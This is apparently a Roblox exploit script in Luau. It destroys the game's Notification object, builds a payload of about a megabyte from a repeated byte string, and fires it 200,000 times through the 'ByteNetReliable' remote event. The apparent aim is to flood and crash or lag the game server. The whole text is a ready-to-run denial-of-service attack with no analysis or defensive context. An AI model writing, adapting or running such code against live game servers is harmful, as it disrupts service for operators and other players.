local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Event = ReplicatedStorage:WaitForChild("ByteNetReliable")
local Notification = ReplicatedStorage:WaitForChild("GameEvents"):FindFirstChild("Notification")
local raw = "\n\0\0\242\165f\217\0B\0\0`yc4\232A"
local payloadString = string.rep(raw, 52550)
if Notification then
    Notification:Destroy()
end
local payload = buffer.fromstring(payloadString)

for _ = 1, 200000 do
    task.spawn(function()
    Event:FireServer(payload)
    end)
end
